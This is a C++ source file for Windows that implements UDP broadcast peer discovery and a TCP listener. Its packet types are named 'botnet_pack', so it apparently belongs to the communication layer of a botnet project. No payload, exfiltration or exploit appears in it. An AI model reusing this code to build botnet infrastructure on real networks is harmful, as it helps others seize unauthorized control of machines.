#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <malloc.h>
#include <thread>
#include "Communication.h"
#include "network.h"


//Private
void Communication::SendReply(struct sockaddr_in& client)
{
	char* buf = (char*)malloc(BOTNET_PACK_SIZE);
	if (buf == nullptr)
	{
		perror("can't malloc SendReply");
		exit(1);
	}

	struct botnet_pack* p = (struct botnet_pack*)buf;

	p->type = PACK_TYPE::SYNC_REPLY;

	sendto(udp_sock, buf, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&client, sizeof(client));

	free(buf);
}
//Public
Communication::Communication()
{
	udp_sock = socket(AF_INET, SOCK_DGRAM, 0); 
	check(udp_sock, "can't create udp_sock");
	
	int trueflag = 1;
	setsockopt(udp_sock, SOL_SOCKET, SO_BROADCAST, (char*)&trueflag, sizeof(trueflag));

	// Create a server hint structure for the server
	struct sockaddr_in serverHint;
	serverHint.sin_addr.S_un.S_addr = ADDR_ANY; // Us any IP address available on the machine
	serverHint.sin_family = AF_INET; // Address format is IPv4
	serverHint.sin_port = htons(54000); // Convert from little to big endian

	// Try and bind the socket to the IP and port
	check(bind(udp_sock, (struct sockaddr*)&serverHint, sizeof(serverHint)), "can't bind udp socket");

	tcp_sock = socket(AF_INET, SOCK_STREAM, 0);
	check(tcp_sock, "can't create tcp_sock");

	serverHint.sin_addr.S_un.S_addr = ADDR_ANY; // Us any IP address available on the machine
	serverHint.sin_family = AF_INET; // Address format is IPv4
	serverHint.sin_port = htons(55000); // Convert from little to big endian

	check(bind(tcp_sock, (struct sockaddr*)&serverHint, sizeof(serverHint)), "can't bind tcp socket");
	
	network = LocalNetwork();
}

//Sends a broadcast SyncRequest
void Communication::SyncRequest()
{
	//TODO - multiple networks
	ULONG32 host;
	ULONG32 netmask;

	char *buf = (char*)malloc(BOTNET_PACK_SIZE);
	if (buf == NULL)
	{
		printf("%s\n", "can't allocate memory");
		exit(1);
	}

	struct botnet_pack* p;
	p = (struct botnet_pack*)buf;
	struct sockaddr_in addr;

	// send request threw each adapter
	for (size_t i = 0; DEC_ADAPTER_IPS_ARR[i].hip; i++) 
	{
		memset(buf, 0, BOTNET_PACK_SIZE);
		memset(&addr, 0, sizeof(addr));

		// calculating Broadcast IP
		host = DEC_ADAPTER_IPS_ARR[i].hip; // TODO
		netmask = DEC_ADAPTER_IPS_ARR[i].netmask;

		addr.sin_family = AF_INET;
		addr.sin_port = htons(54000);
		addr.sin_addr.S_un.S_addr = ~((netmask | host) ^ host); //ty leo

		// adding data to the packet 
		p->type = SYNC_REQUEST;

		// send broadcast request for sync
		sendto(udp_sock, buf, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&addr, sizeof(addr));
	}

	// free the allocated data
	free(buf);
}

//Should be run on a seperate thread
void Communication::HandleIncomingsUDP()
{
	char* const buf = (char*)malloc(BOTNET_PACK_SIZE);

	//checking pointer allocation
	if (buf == nullptr)
	{
		perror("can't malloc HandleIncomings");
		exit(1);
	}

	//create a pack pointer on buf
	const struct botnet_pack* p;
	p = (struct botnet_pack*)buf;

	//client sending the data (src)
	struct sockaddr_in client;
	int client_size = sizeof(client);
	

	while (1) // TODO - condition(advanced)
	{
		ZeroMemory(&client, client_size);
		memset(buf, 0, BOTNET_PACK_SIZE);

		recvfrom(udp_sock, buf, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&client, &client_size);
		
		if ([=]()
			{
				for (size_t i = 0; DEC_ADAPTER_IPS_ARR[i].hip; i++)
					if (DEC_ADAPTER_IPS_ARR[i].hip == client.sin_addr.s_addr)
						return 1;
					return 0;
			}())
			continue;

		switch (p->type)
		{
		case SYNC_REPLY:
			network.AddHost(client.sin_addr.S_un.S_addr);
			break;
		case SYNC_REQUEST:
			network.AddHost(client.sin_addr.S_un.S_addr);
			SendReply(client);
		default: //More will be added
			break;
		}

		Sleep(1000);
	}
	free(buf);
}

void Communication::HandleIncomingsTCP()
{
	//open tcp_sock
	listen(tcp_sock, BACKLOG);

	fd_set current_sockets, ready_sockets;
	
	//initialize my current_sockets
	FD_ZERO(&current_sockets);
	FD_SET(tcp_sock, &current_sockets);

	while (1) //TODO - condition(advanced)
	{
		ready_sockets = current_sockets;

		check(select(FD_SETSIZE, &ready_sockets, NULL, NULL, NULL), "select error");

		for (size_t i = 0; i < FD_SETSIZE; i++)
		{
			if (FD_ISSET(i, &ready_sockets))
			{
				if (i == tcp_sock)
				{
					SOCKET client_socket = accept(tcp_sock, NULL, NULL);
					FD_SET(client_socket, &current_sockets);
				}
				else
				{
					//version control
					FD_CLR(i, &current_sockets);
				}
			}
		}


		Sleep(1000);
	}
}
